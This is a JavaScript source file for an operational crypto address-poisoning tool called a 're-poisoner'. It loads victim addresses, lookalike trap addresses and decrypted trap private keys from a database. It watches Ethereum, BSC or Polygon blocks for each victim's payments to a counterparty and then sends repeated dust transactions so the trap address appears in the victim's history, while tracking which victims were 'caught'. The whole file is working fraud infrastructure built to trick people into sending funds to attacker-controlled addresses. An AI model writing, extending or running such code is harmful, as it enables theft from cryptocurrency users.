import 'dotenv/config';
import path from 'path';
import { fileURLToPath } from 'url';
import { createPublicClient, http } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { exec } from 'child_process';
import { promisify } from 'util';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

// --- Recreate __dirname for ES Modules ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const execAsync = promisify(exec);

console.log('[DEBUG] Starting re_poison.js...');

// --- Supabase Service Client (bypass RLS) ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
  console.log('[DEBUG] Supabase service client initialized');
} else {
  console.warn('[DEBUG] Supabase service credentials missing – campaign lookup disabled');
}

// --- Config ---
const {
  files: { caught: caughtFile },
  rpc: { observer: observerRpcUrl },
  rePoison: { cooldownMs, dustRetries, delayBetweenMs },
} = config;

// --- State ---
const victims = new Map();
let blockPollInterval = null;
let caughtVictimsPollInterval = null;
let lastBlockProcessed = 0n;

// Async Mutex Lock to prevent RPC exhaustion
let isScanning = false;

// ─── Load caught victims from database ───
const caughtVictims = new Set();

async function loadCaughtVictims() {
  if (!supabaseService) return;
  try {
    // Fetch all traps marked as caught for this chain
    const { data, error } = await supabaseService
      .from('traps')
      .select('victim_address')
      .eq('is_caught', true);

    if (error) {
      console.warn(`[DEBUG] Supabase query for caught victims failed: ${error.message}`);
      return;
    }

    if (data && data.length > 0) {
      const newSet = new Set(data.map(row => row.victim_address.toLowerCase()));
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
      console.log(`[DEBUG] Loaded ${caughtVictims.size} caught victims from database`);
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not load caught victims from DB: ${err.message}`);
  }
}

// ─── Load traps from database ───
async function loadTrapsFromDB() {
  if (!supabaseService) {
    console.error('[re_poison] Supabase service not available');
    process.exit(1);
  }

  try {
    // Get all campaigns for this chain
    const { data: campaigns, error: campError } = await supabaseService
      .from('campaigns')
      .select('id')
      .eq('chain', chainName);

    if (campError) {
      console.error(`[DEBUG] Failed to fetch campaigns: ${campError.message}`);
      return 0;
    }

    if (!campaigns || campaigns.length === 0) {
      console.log(`[DEBUG] No campaigns found for chain ${chainName}`);
      return 0;
    }

    const campaignIds = campaigns.map(c => c.id);

    // Fetch traps for these campaigns
    const { data: traps, error: trapError } = await supabaseService
      .from('traps')
      .select('id, campaign_id, victim_address, trap_address, counterparty_address, trap_private_key_enc')
      .in('campaign_id', campaignIds);

    if (trapError) {
      console.error(`[DEBUG] Failed to fetch traps: ${trapError.message}`);
      return 0;
    }

    if (!traps || traps.length === 0) {
      console.log(`[DEBUG] No traps found for campaigns on chain ${chainName}`);
      return 0;
    }

    console.log(`[DEBUG] Fetched ${traps.length} traps from database`);

    let loaded = 0;
    for (const row of traps) {
      try {
        const privateKey = decrypt(row.trap_private_key_enc);
        // Verify the key works
        // We'll store in victims map
        const victim = row.victim_address.toLowerCase();
        const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
        const campaignId = row.campaign_id;

        // If counterparty is null, we treat as wildcard
        victims.set(victim, {
          privateKey,
          trapAddress: row.trap_address.toLowerCase(),
          counterparty,
          lastPoison: 0,
          campaignId,
        });
        loaded++;
      } catch (err) {
        console.warn(`[DEBUG] Failed to decrypt trap for victim ${row.victim_address}: ${err.message}`);
      }
    }

    console.log(`[DEBUG] Loaded ${loaded} victims from database`);
    return loaded;
  } catch (err) {
    console.error(`[DEBUG] Error loading traps from DB: ${err.message}`);
    return 0;
  }
}

// --- MULTI‑CHAIN ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';
const chainId = chainCfg?.chainId || 1;

let viemChain;
switch (chainName) {
  case 'bsc':
    viemChain = bsc;
    break;
  case 'polygon':
    viemChain = polygon;
    break;
  default:
    viemChain = mainnet;
}

// RPC URL: prefer chain‑specific RPC, otherwise use legacy observerRpcUrl
const chainRpc = chainCfg?.rpc || observerRpcUrl;

console.log(`[DEBUG] Chain: ${chainName}, Native symbol: ${nativeSymbol}, Viem chain: ${viemChain.name}`);
console.log(`[DEBUG] Observer RPC: ${chainRpc}`);
console.log('[DEBUG] cooldownMs:', cooldownMs);
console.log('[DEBUG] dustRetries:', dustRetries);
console.log('[DEBUG] delayBetweenMs:', delayBetweenMs);

const COOLDOWN_MS = cooldownMs || 60 * 60 * 1000;
const DUST_RETRIES = dustRetries || 2;
const DELAY_BETWEEN_DUST_MS = delayBetweenMs || 2000;
const EXEC_TIMEOUT_MS = 60000;

// --- Dynamic cooldown limits ---
const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);
const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);

// --- Deduplication and concurrency control ---
const processedTxHashes = new Map();
const trapLocks = new Map();

// --- Per‑victim statistics ---
const victimStats = new Map();
const victimTxTimestamps = new Map();
let lastStatsLogTime = 0;
const STATS_LOG_INTERVAL_MS = 60 * 60 * 1000;

// --- HTTP client for block polling ---
const client = createPublicClient({
  chain: viemChain,
  transport: http(chainRpc, { timeout: 10000 }),
});

// --- Helper: retry wrapper ---
async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
  return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
}

// --- Compute dynamic cooldown ---
function getDynamicCooldown(victimAddress) {
  const timestamps = victimTxTimestamps.get(victimAddress) || [];
  if (timestamps.length < 2) return COOLDOWN_MS;

  let intervals = [];
  for (let i = 1; i < timestamps.length; i++) {
    intervals.push(timestamps[i] - timestamps[i-1]);
  }
  const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;

  let cooldown = avgInterval * 0.3;
  cooldown = Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
  return cooldown;
}

// --- Send dust via duster.py ---
async function sendDust(privateKey, victimAddress, campaignId) {
  const dusterPath = path.resolve(__dirname, '../tools/duster.py');

  const env = { ...process.env, CHAIN: chainName };
  if (campaignId) {
    env.CAMPAIGN_ID = campaignId;
  }

  const cmd = `python3 ${dusterPath} ${privateKey} ${victimAddress}`;

  try {
    const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
    if (stderr) logger.warn(`duster stderr: ${stderr}`);
    logger.info(`duster stdout: ${stdout.trim()}`);
    return true;
  } catch (error) {
    if (error.killed && error.signal === 'SIGTERM') {
      logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
    } else {
      logger.error(`duster error: ${error.message}`);
    }
    return false;
  }
}

// --- Poison a victim ---
async function poisonVictim(victimAddress, privateKey, campaignId) {
  logger.info(`Re‑poisoning victim ${victimAddress}...`);
  let successCount = 0;
  for (let i = 0; i < DUST_RETRIES; i++) {
    const ok = await sendDust(privateKey, victimAddress, campaignId);
    if (ok) successCount++;
    if (i < DUST_RETRIES - 1) {
      await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
    }
  }
  const msg = `Re‑poison complete: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}`;
  logger.info(msg);

  try {
    await sendAlert(`♻️ ${msg}`, 'info', campaignId);
  } catch (err) {
    logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
  }

  const entry = victims.get(victimAddress);
  if (entry) entry.lastPoison = Date.now();

  let stats = victimStats.get(victimAddress) || { attempts: 0, successes: 0, failures: 0 };
  stats.attempts++;
  if (successCount > 0) stats.successes++;
  else stats.failures++;
  victimStats.set(victimAddress, stats);

  const totalAttempts = Array.from(victimStats.values()).reduce((sum, s) => sum + s.attempts, 0);
  const now = Date.now();
  if (totalAttempts % 10 === 0 || now - lastStatsLogTime > STATS_LOG_INTERVAL_MS) {
    let summary = `📊 Re‑poison stats (total attempts: ${totalAttempts}):\n`;
    for (const [addr, s] of victimStats) {
      summary += `  ${addr}: ${s.successes} success, ${s.failures} fail (${s.attempts} attempts)\n`;
    }
    logger.info(summary);
    lastStatsLogTime = now;
  }
}

// --- Check a single transaction ---
function checkTransaction(tx) {
  if (!tx || !tx.from || !tx.to || !tx.hash) return;

  const from = tx.from.toLowerCase();
  const to = tx.to.toLowerCase();
  const hash = tx.hash;
  const now = Date.now();

  // Deduplicate
  if (processedTxHashes.has(hash)) return;
  processedTxHashes.set(hash, now);

  // Size cap
  if (processedTxHashes.size > 50000) {
    const toDelete = Math.min(10000, processedTxHashes.size - 50000);
    let count = 0;
    for (const [key] of processedTxHashes) {
      if (count++ >= toDelete) break;
      processedTxHashes.delete(key);
    }
  }

  // Caught victim exclusion
  if (caughtVictims.has(from)) {
    victims.delete(from);
    return;
  }

  if (!victims.has(from)) return;

  const entry = victims.get(from);

  // Counterparty wildcard check
  if (entry.counterparty && to !== entry.counterparty) {
    return;
  }

  // Dynamic cooldown check
  let timestamps = victimTxTimestamps.get(from) || [];
  timestamps.push(Date.now());
  if (timestamps.length > 10) timestamps = timestamps.slice(-10);
  victimTxTimestamps.set(from, timestamps);

  const dynamicCooldown = getDynamicCooldown(from);
  if (now - entry.lastPoison < dynamicCooldown) return;

  // Prevent overlapping poison calls
  if (trapLocks.get(entry.privateKey)) {
    console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping.`);
    return;
  }
  trapLocks.set(entry.privateKey, true);

  // Async Execution
  (async () => {
    try {
      const counterpartyMsg = entry.counterparty ? entry.counterparty : "[WILDCARD TARGET]";
      logger.info(`Victim ${from} sent to ${counterpartyMsg}: ${tx.hash}`);

      try {
        await sendAlert(`🔔 Victim targeting counterparty\nVictim: ${from}\nCounterparty: ${counterpartyMsg}\nTX: ${tx.hash}`, 'info', entry.campaignId);
      } catch (alertErr) {
        logger.warn(`Failed to send initial alert: ${alertErr.message}`);
      }

      await poisonVictim(from, entry.privateKey, entry.campaignId);
    } catch (err) {
      logger.error(`Error in async poison task for ${from}: ${err.message}`);
    } finally {
      trapLocks.delete(entry.privateKey);
    }
  })();
}

// --- Block scanner ---
async function scanNewBlocks() {
  if (isScanning) return;
  isScanning = true;

  try {
    const currentBlock = await withRpcRetry(
      () => client.getBlockNumber(),
      'getBlockNumber',
      2,
      1000
    );

    if (lastBlockProcessed === 0n) {
      lastBlockProcessed = currentBlock;
      return;
    }

    for (let block = lastBlockProcessed + 1n; block <= currentBlock; block++) {
      const fullBlock = await withRpcRetry(
        () => client.getBlock({ blockNumber: block, includeTransactions: true }),
        `getBlock(${block})`,
        2,
        1000
      );

      if (fullBlock && fullBlock.transactions) {
        for (const tx of fullBlock.transactions) {
          try {
            checkTransaction(tx);
          } catch (err) {
            logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
          }
        }
      }
    }

    lastBlockProcessed = currentBlock;
  } catch (err) {
    logger.warn(`Block scan error: ${err.message}`);
  } finally {
    isScanning = false;
  }
}

// --- Start watcher ---
function startWatcher() {
  console.log('[DEBUG] Starting block‑based watcher...');
  logger.info('Watching new blocks for victim → counterparty transactions...');

  (async () => {
    try {
      lastBlockProcessed = await client.getBlockNumber();
      console.log(`[DEBUG] Starting from block ${lastBlockProcessed}`);
    } catch (e) {
      console.error(`[DEBUG] Failed to get initial block: ${e.message}`);
    }
  })();

  blockPollInterval = setInterval(scanNewBlocks, 2000);

  // Poll caught victims every 15 seconds from DB
  caughtVictimsPollInterval = setInterval(loadCaughtVictims, 15000);

  console.log('[DEBUG] Watcher started.');
}

// --- Graceful shutdown ---
setupGracefulShutdown();

onShutdown(async () => {
  console.log('[DEBUG] Shutting down...');
  if (blockPollInterval) clearInterval(blockPollInterval);
  if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
  console.log('[DEBUG] Intervals cleared.');
});

// --- Main ---
console.log('[DEBUG] Loading traps from database...');
const loaded = await loadTrapsFromDB();
if (loaded === 0) {
  logger.error(`No victims loaded from database. Exiting.`);
  console.error(`[DEBUG] No victims loaded. Exiting.`);
  process.exit(1);
}

// Initial load of caught victims
await loadCaughtVictims();

console.log('[DEBUG] Starting watcher...');
startWatcher();
logger.info('Re‑poisoner is running. Press Ctrl+C to stop.');